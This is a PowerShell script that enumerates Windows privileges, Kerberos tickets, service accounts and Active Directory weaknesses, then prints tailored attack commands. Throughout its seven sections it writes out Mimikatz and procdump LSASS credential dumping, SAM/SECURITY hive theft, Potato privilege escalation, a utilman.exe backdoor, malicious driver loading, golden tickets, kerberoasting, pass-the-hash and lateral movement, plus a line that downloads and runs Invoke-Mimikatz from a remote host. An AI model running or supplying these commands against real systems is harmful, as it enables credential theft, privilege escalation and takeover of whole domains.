# ============================================================================
# ADVANCED SERVICE ACCOUNT SECURITY AUDIT & EXPLOITATION REFERENCE
# ============================================================================
# Purpose: Comprehensive enumeration and exploit command generation
# Version: 2.1 - Syntax Fixed
# ============================================================================

function Invoke-ComprehensiveServiceAudit {
    [CmdletBinding()]
    param(
        [switch]$GenerateExploitCommands,
        [switch]$DetailedOutput,
        [switch]$ExportResults,
        [string]$OutputPath = ".\AuditResults_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
    )
    
    $script:StartTime = Get-Date
    $script:ExploitCommands = @()
    $script:Findings = @()
    
    # Banner
    Write-Host "`n================================================================================" -ForegroundColor Cyan
    Write-Host "         ADVANCED SERVICE ACCOUNT SECURITY AUDIT FRAMEWORK" -ForegroundColor Cyan
    Write-Host "         Enumeration + Exploitation Command Generation" -ForegroundColor Cyan
    Write-Host "================================================================================" -ForegroundColor Cyan

    Write-Host "`n[+] Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[+] Current User: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Gray
    Write-Host "[+] Computer: $env:COMPUTERNAME" -ForegroundColor Gray
    Write-Host "[+] Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)" -ForegroundColor Gray
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Host "[+] Admin Rights: $(if($isAdmin){'YES'}else{'NO'})" -ForegroundColor $(if($isAdmin){'Red'}else{'Yellow'})
    Write-Host ""

    # ========================================================================
    # SECTION 1: PRIVILEGE ENUMERATION & EXPLOITATION
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 1] PRIVILEGE ENUMERATION & TOKEN MANIPULATION" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host "`n[+] Current User Token Privileges:" -ForegroundColor Cyan
    $privOutput = whoami /priv 2>$null
    $privileges = @{}
    
    $criticalPrivileges = @{
        'SeDebugPrivilege' = 'Process memory access, credential dumping'
        'SeTcbPrivilege' = 'Act as part of OS, create tokens'
        'SeBackupPrivilege' = 'Backup files, read any file'
        'SeRestorePrivilege' = 'Restore files, write any file'
        'SeCreateTokenPrivilege' = 'Create access tokens'
        'SeAssignPrimaryTokenPrivilege' = 'Replace process tokens'
        'SeLoadDriverPrivilege' = 'Load kernel drivers'
        'SeTakeOwnershipPrivilege' = 'Take ownership of files'
        'SeImpersonatePrivilege' = 'Impersonate tokens (Potato attacks)'
    }
    
    foreach ($line in $privOutput -split "`n") {
        $line = $line.Trim()
        foreach ($priv in $criticalPrivileges.Keys) {
            if ($line -match $priv) {
                $status = if ($line -match "Enabled") { "ENABLED" } else { "Disabled" }
                $privileges[$priv] = $status
                
                $color = if ($status -eq "ENABLED") { "Red" } else { "Yellow" }
                Write-Host "  [!] $priv : $status" -ForegroundColor $color
                Write-Host "      Purpose: $($criticalPrivileges[$priv])" -ForegroundColor Gray
                
                if ($status -eq "ENABLED") {
                    Add-Finding "CRITICAL" "Enabled Privilege: $priv" $criticalPrivileges[$priv]
                    
                    # Generate exploit commands based on privilege
                    if ($priv -eq 'SeDebugPrivilege') {
                        Write-Host "`n      [EXPLOIT COMMANDS - CREDENTIAL DUMPING]:" -ForegroundColor Red
                        Write-Host "      # Mimikatz - LSASS Dump" -ForegroundColor White
                        Write-Host "      mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
                        Write-Host "      mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
                        
                        Write-Host "`n      # Procdump + Mimikatz Offline" -ForegroundColor White
                        Write-Host "      procdump.exe -accepteula -ma lsass.exe lsass.dmp" -ForegroundColor Yellow
                        Write-Host "      mimikatz.exe `"sekurlsa::minidump lsass.dmp`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
                        
                        Write-Host "`n      # PowerShell LSASS Dump" -ForegroundColor White
                        Write-Host "      IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-Mimikatz.ps1')" -ForegroundColor Yellow
                        Write-Host "      Invoke-Mimikatz -DumpCreds" -ForegroundColor Yellow
                        
                        Write-Host "`n      # SharpDump (C# LSASS Dumper)" -ForegroundColor White
                        Write-Host "      SharpDump.exe" -ForegroundColor Yellow
                        
                        Add-ExploitCommand "Credential Dumping" "mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`""
                    }
                    elseif ($priv -eq 'SeImpersonatePrivilege') {
                        Write-Host "`n      [EXPLOIT COMMANDS - POTATO ATTACKS]:" -ForegroundColor Red
                        Write-Host "      # JuicyPotato (Windows Server 2016/2019)" -ForegroundColor White
                        Write-Host "      JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a `"/c whoami`" -t *" -ForegroundColor Yellow
                        
                        Write-Host "`n      # PrintSpoofer (Windows 10/Server 2019+)" -ForegroundColor White
                        Write-Host "      PrintSpoofer.exe -i -c cmd" -ForegroundColor Yellow
                        Write-Host "      PrintSpoofer.exe -c `"powershell -ep bypass -nop`"" -ForegroundColor Yellow
                        
                        Write-Host "`n      # GodPotato (Latest)" -ForegroundColor White
                        Write-Host "      GodPotato.exe -cmd `"cmd /c whoami`"" -ForegroundColor Yellow
                        
                        Add-ExploitCommand "Token Impersonation" "PrintSpoofer.exe -i -c powershell"
                    }
                    elseif ($priv -eq 'SeBackupPrivilege') {
                        Write-Host "`n      [EXPLOIT COMMANDS - FILE/REGISTRY ACCESS]:" -ForegroundColor Red
                        Write-Host "      # Copy SAM/SYSTEM Hives" -ForegroundColor White
                        Write-Host "      reg save HKLM\SAM C:\temp\sam.hive" -ForegroundColor Yellow
                        Write-Host "      reg save HKLM\SYSTEM C:\temp\system.hive" -ForegroundColor Yellow
                        Write-Host "      reg save HKLM\SECURITY C:\temp\security.hive" -ForegroundColor Yellow
                        
                        Write-Host "`n      # Extract with Impacket" -ForegroundColor White
                        Write-Host "      impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL" -ForegroundColor Yellow
                        
                        Add-ExploitCommand "Registry Dump" "reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM system.hive"
                    }
                    elseif ($priv -eq 'SeRestorePrivilege') {
                        Write-Host "`n      [EXPLOIT COMMANDS - FILE MANIPULATION]:" -ForegroundColor Red
                        Write-Host "      # Replace utilman.exe with cmd.exe for backdoor" -ForegroundColor White
                        Write-Host "      takeown /f C:\Windows\System32\utilman.exe" -ForegroundColor Yellow
                        Write-Host "      icacls C:\Windows\System32\utilman.exe /grant administrators:F" -ForegroundColor Yellow
                        Write-Host "      copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe" -ForegroundColor Yellow
                    }
                    elseif ($priv -eq 'SeLoadDriverPrivilege') {
                        Write-Host "`n      [EXPLOIT COMMANDS - KERNEL EXPLOITATION]:" -ForegroundColor Red
                        Write-Host "      # Load Malicious Driver" -ForegroundColor White
                        Write-Host "      EoPLoadDriver.exe System\CurrentControlSet\MyService C:\temp\driver.sys" -ForegroundColor Yellow
                    }
                    Write-Host ""
                }
            }
        }
    }
    
    # ========================================================================
    # SECTION 2: KERBEROS TICKET ANALYSIS
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 2] KERBEROS TICKET ANALYSIS & ATTACK VECTORS" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host "`n[+] Cached Kerberos Tickets:" -ForegroundColor Cyan
    $ticketOutput = klist 2>$null
    $ticketCount = 0
    $tickets = @()
    
    if ($LASTEXITCODE -eq 0) {
        $currentTicket = $null
        foreach ($line in $ticketOutput -split "`n") {
            $line = $line.Trim()
            if ($line -match "Server:\s*(.+)") {
                $ticketCount++
                $currentTicket = @{
                    Server = $matches[1].Trim()
                    Number = $ticketCount
                }
            }
            if ($line -match "End Time:\s*(.+)" -and $currentTicket) {
                $currentTicket.EndTime = $matches[1].Trim()
                $tickets += $currentTicket
                
                Write-Host "  [Ticket #$($currentTicket.Number)]" -ForegroundColor Yellow
                Write-Host "    Service: $($currentTicket.Server)" -ForegroundColor White
                Write-Host "    Expires: $($currentTicket.EndTime)" -ForegroundColor Gray
                
                $currentTicket = $null
            }
        }
        
        Write-Host "`n  Total Cached Tickets: $ticketCount" -ForegroundColor $(if($ticketCount -gt 10){'Yellow'}else{'Green'})
        
        if ($ticketCount -gt 0) {
            Write-Host "`n  [KERBEROS ATTACK COMMANDS]:" -ForegroundColor Red
            
            Write-Host "`n  # Export All Tickets (Mimikatz)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
            
            Write-Host "`n  # Export Tickets (Rubeus)" -ForegroundColor White
            Write-Host "  Rubeus.exe dump /nowrap" -ForegroundColor Yellow
            Write-Host "  Rubeus.exe dump /luid:0x[LUID] /nowrap" -ForegroundColor Yellow
            
            Write-Host "`n  # Pass-the-Ticket (PTT)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
            Write-Host "  Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
            
            Write-Host "`n  # Over-Pass-the-Hash (OPTH)" -ForegroundColor White
            Write-Host "  mimikatz.exe `"sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[HASH] /run:powershell`"" -ForegroundColor Yellow
            Write-Host "  Rubeus.exe asktgt /user:[USER] /rc4:[HASH] /ptt" -ForegroundColor Yellow
            
            Write-Host "`n  # Golden Ticket" -ForegroundColor White
            Write-Host "  mimikatz.exe `"kerberos::golden /user:Administrator /domain:[DOMAIN] /sid:[SID] /krbtgt:[HASH] /ptt`"" -ForegroundColor Yellow
            
            Add-ExploitCommand "Ticket Export" "Rubeus.exe dump /nowrap"
        }
    } else {
        Write-Host "  No tickets found or klist failed" -ForegroundColor Gray
    }
    
    # ========================================================================
    # SECTION 3: SERVICE ACCOUNT DISCOVERY
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 3] SERVICE ACCOUNT ENUMERATION & PASSWORD EXTRACTION" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host "`n[+] Services with Non-System Accounts:" -ForegroundColor Cyan
    $services = Get-CimInstance Win32_Service | Where-Object { 
        $_.StartName -and 
        $_.StartName -notmatch '^(LocalSystem|NT AUTHORITY|NT SERVICE|LocalService|NetworkService)' 
    }
    
    $domainServiceAccounts = @()
    $localServiceAccounts = @()
    
    foreach ($svc in $services) {
        $svcInfo = @{
            Name = $svc.Name
            DisplayName = $svc.DisplayName
            Account = $svc.StartName
            State = $svc.State
            StartMode = $svc.StartMode
            ProcessId = $svc.ProcessId
            PathName = $svc.PathName
        }
        
        if ($svc.StartName -match '^[A-Za-z0-9_-]+\\.+') {
            $domainServiceAccounts += $svcInfo
        } else {
            $localServiceAccounts += $svcInfo
        }
    }
    
    if ($domainServiceAccounts.Count -gt 0) {
        Write-Host "`n  [!] DOMAIN SERVICE ACCOUNTS DETECTED: $($domainServiceAccounts.Count)" -ForegroundColor Red
        
        foreach ($svc in $domainServiceAccounts) {
            Write-Host "`n  [Service: $($svc.Name)]" -ForegroundColor Yellow
            Write-Host "    Display Name: $($svc.DisplayName)" -ForegroundColor White
            Write-Host "    Account: $($svc.Account)" -ForegroundColor Red
            Write-Host "    State: $($svc.State)" -ForegroundColor $(if($svc.State -eq 'Running'){'Green'}else{'Gray'})
            Write-Host "    Start Mode: $($svc.StartMode)" -ForegroundColor Gray
            Write-Host "    Binary Path: $($svc.PathName)" -ForegroundColor Gray
            
            if ($svc.State -eq 'Running' -and $svc.ProcessId -gt 0) {
                Write-Host "    Process ID: $($svc.ProcessId)" -ForegroundColor Gray
                
                try {
                    $proc = Get-Process -Id $svc.ProcessId -ErrorAction SilentlyContinue
                    if ($proc) {
                        Write-Host "    Memory: $([math]::Round($proc.WorkingSet64/1MB,2)) MB" -ForegroundColor Gray
                    }
                } catch {}
            }
            
            Add-Finding "HIGH" "Domain Service Account" "$($svc.Name) running as $($svc.Account)"
        }
        
        Write-Host "`n  [SERVICE ACCOUNT EXPLOITATION COMMANDS]:" -ForegroundColor Red
        
        Write-Host "`n  # Method 1: Extract Credentials from LSA Secrets" -ForegroundColor White
        Write-Host "  mimikatz.exe `"privilege::debug`" `"token::elevate`" `"lsadump::secrets`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  reg save HKLM\SECURITY security.hive" -ForegroundColor Yellow
        Write-Host "  reg save HKLM\SYSTEM system.hive" -ForegroundColor Yellow
        Write-Host "  impacket-secretsdump -security security.hive -system system.hive LOCAL" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 2: Process Memory Dump" -ForegroundColor White
        foreach ($svc in $domainServiceAccounts | Where-Object {$_.State -eq 'Running'} | Select-Object -First 3) {
            Write-Host "  procdump.exe -accepteula -ma $($svc.ProcessId) $($svc.Name).dmp" -ForegroundColor Yellow
        }
        
        Write-Host "`n  # Method 3: Token Impersonation" -ForegroundColor White
        Write-Host "  incognito.exe list_tokens -u" -ForegroundColor Yellow
        Write-Host "  Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 4: Kerberoasting" -ForegroundColor White
        Write-Host "  setspn -T [DOMAIN] -Q */*" -ForegroundColor Yellow
        Write-Host "  Rubeus.exe kerberoast /nowrap" -ForegroundColor Yellow
        Write-Host "  hashcat -m 13100 -a 0 ticket.txt wordlist.txt --force" -ForegroundColor Yellow
        
        Add-ExploitCommand "LSA Secrets Dump" "mimikatz.exe `"lsadump::secrets`""
    }
    
    if ($localServiceAccounts.Count -gt 0) {
        Write-Host "`n  [+] Local Service Accounts: $($localServiceAccounts.Count)" -ForegroundColor Yellow
    }
    
    # ========================================================================
    # SECTION 4: ACTIVE DIRECTORY ENUMERATION
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 4] ACTIVE DIRECTORY ENUMERATION & ATTACK VECTORS" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    $domainJoined = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
    
    if ($domainJoined) {
        $domain = (Get-WmiObject Win32_ComputerSystem).Domain
        Write-Host "`n[+] Domain Joined: $domain" -ForegroundColor Green
        
        # AS-REP Roasting
        Write-Host "`n[+] AS-REP Roastable Accounts:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
            $searcher.PageSize = 1000
            $asrepUsers = $searcher.FindAll()
            
            if ($asrepUsers.Count -gt 0) {
                Write-Host "  [!] VULNERABLE ACCOUNTS FOUND: $($asrepUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $asrepUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    Write-Host "`n  [User: $sam]" -ForegroundColor Red
                    
                    Add-Finding "CRITICAL" "AS-REP Roastable" "$sam - No Kerberos pre-authentication"
                }
                
                Write-Host "`n  [AS-REP ROASTING COMMANDS]:" -ForegroundColor Red
                Write-Host "  Rubeus.exe asreproast /format:hashcat /nowrap" -ForegroundColor Yellow
                Write-Host "  impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat" -ForegroundColor Yellow
                Write-Host "  hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt --force" -ForegroundColor Yellow
                
                Add-ExploitCommand "AS-REP Roast" "Rubeus.exe asreproast /format:hashcat /nowrap"
            } else {
                Write-Host "  No AS-REP roastable accounts found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating AS-REP: $_" -ForegroundColor Red
        }
        
        # Kerberoasting
        Write-Host "`n[+] Kerberoastable Accounts:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))'
            $searcher.PageSize = 1000
            $spnUsers = $searcher.FindAll()
            
            if ($spnUsers.Count -gt 0) {
                Write-Host "  [!] KERBEROASTABLE ACCOUNTS FOUND: $($spnUsers.Count)" -ForegroundColor Red
                
                foreach ($user in $spnUsers) {
                    $sam = $user.Properties['samaccountname'][0]
                    $spns = $user.Properties['serviceprincipalname']
                    
                    Write-Host "`n  [User: $sam]" -ForegroundColor Red
                    Write-Host "    SPNs:" -ForegroundColor Gray
                    foreach ($spn in $spns) {
                        Write-Host "      - $spn" -ForegroundColor Yellow
                    }
                    
                    Add-Finding "HIGH" "Kerberoastable Account" "$sam with $($spns.Count) SPNs"
                }
                
                Write-Host "`n  [KERBEROASTING COMMANDS]:" -ForegroundColor Red
                Write-Host "  Rubeus.exe kerberoast /outfile:hashes.txt /nowrap" -ForegroundColor Yellow
                Write-Host "  impacket-GetUserSPNs $domain/[user]:[pass] -dc-ip [DC_IP] -request" -ForegroundColor Yellow
                Write-Host "  hashcat -m 13100 -a 0 hashes.txt wordlist.txt --force" -ForegroundColor Yellow
                
                Add-ExploitCommand "Kerberoast" "Rubeus.exe kerberoast /nowrap"
            } else {
                Write-Host "  No kerberoastable accounts found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating SPNs: $_" -ForegroundColor Red
        }
        
        # Unconstrained Delegation
        Write-Host "`n[+] Unconstrained Delegation:" -ForegroundColor Cyan
        try {
            $searcher = [adsisearcher]'(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))'
            $searcher.PageSize = 1000
            $unconstrainedComputers = $searcher.FindAll()
            
            if ($unconstrainedComputers.Count -gt 0) {
                Write-Host "  [!] UNCONSTRAINED DELEGATION FOUND: $($unconstrainedComputers.Count)" -ForegroundColor Red
                
                foreach ($comp in $unconstrainedComputers) {
                    $hostname = $comp.Properties['dnshostname'][0]
                    Write-Host "  [Computer: $hostname]" -ForegroundColor Red
                    
                    Add-Finding "CRITICAL" "Unconstrained Delegation" "$hostname"
                }
                
                Write-Host "`n  [EXPLOITATION COMMANDS]:" -ForegroundColor Red
                Write-Host "  Rubeus.exe monitor /interval:5 /nowrap" -ForegroundColor Yellow
                $firstHost = $unconstrainedComputers[0].Properties['dnshostname'][0]
                Write-Host "  SpoolSample.exe [TARGET_DC] $firstHost" -ForegroundColor Yellow
                
                Add-ExploitCommand "Unconstrained Delegation" "Rubeus.exe monitor /interval:5"
            } else {
                Write-Host "  No unconstrained delegation found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating delegation: $_" -ForegroundColor Red
        }
        
    } else {
        Write-Host "`n[!] Not domain-joined - AD enumeration skipped" -ForegroundColor Yellow
    }
    
    # ========================================================================
    # SECTION 5: PROCESS ANALYSIS
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 5] PROCESS & TOKEN ANALYSIS" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host "`n[+] Processes Running as Domain Users:" -ForegroundColor Cyan
    
    try {
        $processes = Get-CimInstance Win32_Process | ForEach-Object {
            try {
                $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction Stop
                if ($owner.Domain -and $owner.Domain -ne $env:COMPUTERNAME -and 
                    $owner.User -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)$') {
                    [PSCustomObject]@{
                        ProcessName = $_.Name
                        PID = $_.ProcessId
                        Domain = $owner.Domain
                        User = $owner.User
                        CommandLine = $_.CommandLine
                    }
                }
            } catch {}
        }
        
        if ($processes) {
            $groupedProcesses = $processes | Group-Object Domain,User
            Write-Host "  Found $($processes.Count) domain user processes" -ForegroundColor Yellow
            
            foreach ($group in $groupedProcesses) {
                $account = $group.Name
                Write-Host "`n  [Account: $account]" -ForegroundColor Yellow
                Write-Host "    Process Count: $($group.Count)" -ForegroundColor Gray
            }
            
            Write-Host "`n  [TOKEN EXPLOITATION]:" -ForegroundColor Red
            Write-Host "  incognito.exe list_tokens -u" -ForegroundColor Yellow
            Write-Host "  Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
            
            Add-ExploitCommand "Token Enumeration" "Invoke-TokenManipulation -ShowAll"
        } else {
            Write-Host "  No domain user processes found" -ForegroundColor Gray
        }
    } catch {
        Write-Host "  Error analyzing processes: $_" -ForegroundColor Red
    }
    
    # LSASS Analysis
    Write-Host "`n[+] LSASS Process Analysis:" -ForegroundColor Cyan
    try {
        $lsass = Get-Process lsass -ErrorAction Stop
        Write-Host "  PID: $($lsass.Id)" -ForegroundColor White
        Write-Host "  Memory: $([math]::Round($lsass.WorkingSet64/1MB,2)) MB" -ForegroundColor Gray
        
        Write-Host "`n  [LSASS CREDENTIAL EXTRACTION]:" -ForegroundColor Red
        Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  procdump.exe -accepteula -ma $($lsass.Id) lsass.dmp" -ForegroundColor Yellow
        Write-Host "  pypykatz lsa minidump lsass.dmp" -ForegroundColor Yellow
        
        Add-ExploitCommand "LSASS Dump" "procdump.exe -accepteula -ma $($lsass.Id) lsass.dmp"
        
    } catch {
        Write-Host "  Could not access LSASS process" -ForegroundColor Red
    }
    
    # ========================================================================
    # SECTION 6: LATERAL MOVEMENT
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 6] LATERAL MOVEMENT TECHNIQUES" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    Write-Host "`n[+] Pass-the-Hash:" -ForegroundColor Cyan
    Write-Host "  mimikatz.exe `"sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[HASH] /run:cmd.exe`"" -ForegroundColor Yellow
    Write-Host "  impacket-psexec [DOMAIN]/[USER]@[TARGET] -hashes :[NTLM]" -ForegroundColor Yellow
    Write-Host "  crackmapexec smb [TARGET] -u [USER] -H [NTLM] -x 'whoami'" -ForegroundColor Yellow
    
    Write-Host "`n[+] Pass-the-Ticket:" -ForegroundColor Cyan
    Write-Host "  mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
    Write-Host "  Rubeus.exe ptt /ticket:[base64_ticket]" -ForegroundColor Yellow
    
    Write-Host "`n[+] WMI Execution:" -ForegroundColor Cyan
    Write-Host "  wmic /node:[TARGET] /user:[USER] /password:[PASS] process call create `"cmd.exe`"" -ForegroundColor Yellow
    
    Write-Host "`n[+] PSExec:" -ForegroundColor Cyan
    Write-Host "  psexec.exe \\[TARGET] -u [USER] -p [PASS] cmd.exe" -ForegroundColor Yellow
    Write-Host "  impacket-psexec [DOMAIN]/[USER]:[PASS]@[TARGET]" -ForegroundColor Yellow
    
    Write-Host "`n[+] WinRM:" -ForegroundColor Cyan
    Write-Host "  Enter-PSSession -ComputerName [TARGET] -Credential [CRED]" -ForegroundColor Yellow
    Write-Host "  evil-winrm -i [TARGET] -u [USER] -p [PASS]" -ForegroundColor Yellow
    
    # ========================================================================
    # SECTION 7: RISK ASSESSMENT
    # ========================================================================
    Write-Host "`n================================================================================" -ForegroundColor Green
    Write-Host "[SECTION 7] RISK ASSESSMENT SUMMARY" -ForegroundColor Green
    Write-Host "================================================================================" -ForegroundColor Green
    
    $criticalFindings = $script:Findings | Where-Object { $_.Severity -eq "CRITICAL" }
    $highFindings = $script:Findings | Where-Object { $_.Severity -eq "HIGH" }
    $mediumFindings = $script:Findings | Where-Object { $_.Severity -eq "MEDIUM" }
    
    $riskScore = ($criticalFindings.Count * 10) + ($highFindings.Count * 5) + ($mediumFindings.Count * 2)
    
    Write-Host "`n[+] Risk Assessment:" -ForegroundColor Cyan
    Write-Host "  Total Risk Score: $riskScore" -ForegroundColor $(
        if($riskScore -gt 30){'Red'}
        elseif($riskScore -gt 15){'Yellow'}
        else{'Green'}
    )
    Write-Host "  Critical Findings: $($criticalFindings.Count)" -ForegroundColor $(if($criticalFindings.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  High Findings: $($highFindings.Count)" -ForegroundColor $(if($highFindings.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  Medium Findings: $($mediumFindings.Count)" -ForegroundColor $(if($mediumFindings.Count -gt 0){'Yellow'}else{'Green'})
    
    if ($script:Findings.Count -gt 0) {
        Write-Host "`n[+] Finding Details:" -ForegroundColor Cyan
        foreach ($finding in $script:Findings) {
            $color = switch($finding.Severity) {
                "CRITICAL" { "Red" }
                "HIGH" { "Red" }
                "MEDIUM" { "Yellow" }
                default { "Gray" }
            }
            Write-Host "  [$($finding.Severity)] $($finding.Category): $($finding.Description)" -ForegroundColor $color
        }
    }
    
    # Export results
    if ($ExportResults) {
        try {
            $reportContent = @"
SERVICE ACCOUNT SECURITY AUDIT REPORT
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $env:COMPUTERNAME
Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)

RISK SCORE: $riskScore
Critical: $($criticalFindings.Count)
High: $($highFindings.Count)
Medium: $($mediumFindings.Count)

FINDINGS:
$($script:Findings | ForEach-Object { "[$($_.Severity)] $($_.Category): $($_.Description)" } | Out-String)
"@
            $reportContent | Out-File -FilePath $OutputPath -Encoding UTF8
            Write-Host "`n[+] Report exported to: $OutputPath" -ForegroundColor Green
        } catch {
            Write-Host "`n[!] Failed to export report: $_" -ForegroundColor Red
        }
    }
    
    $endTime = Get-Date
    $duration = $endTime - $script:StartTime
    
    Write-Host "`n================================================================================" -ForegroundColor Cyan
    Write-Host "AUDIT COMPLETE" -ForegroundColor Cyan
    Write-Host "================================================================================" -ForegroundColor Cyan
    Write-Host "[+] Duration: $($duration.TotalSeconds) seconds" -ForegroundColor Gray
    Write-Host "[+] Findings: $($script:Findings.Count)" -ForegroundColor Gray
    
    if ($riskScore -gt 30) {
        Write-Host "`n[!] CRITICAL RISK LEVEL - IMMEDIATE REMEDIATION REQUIRED" -ForegroundColor Red
    } elseif ($riskScore -gt 15) {
        Write-Host "`n[!] ELEVATED RISK LEVEL - REVIEW AND REMEDIATE" -ForegroundColor Yellow
    } else {
        Write-Host "`n[+] ACCEPTABLE RISK LEVEL" -ForegroundColor Green
    }
    
    Write-Host ""
}

# Helper Functions
function Add-Finding {
    param(
        [string]$Severity,
        [string]$Category,
        [string]$Description
    )
    $script:Findings += [PSCustomObject]@{
        Severity = $Severity
        Category = $Category
        Description = $Description
    }
}

function Add-ExploitCommand {
    param(
        [string]$Category,
        [string]$Command
    )
    $script:ExploitCommands += [PSCustomObject]@{
        Category = $Category
        Command = $Command
    }
}

# Execute
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n[!] WARNING: Not running with administrative privileges" -ForegroundColor Yellow
    Write-Host "[!] Many checks will be limited" -ForegroundColor Yellow
    Write-Host ""
}

Invoke-ComprehensiveServiceAudit -GenerateExploitCommands -DetailedOutput -ExportResults
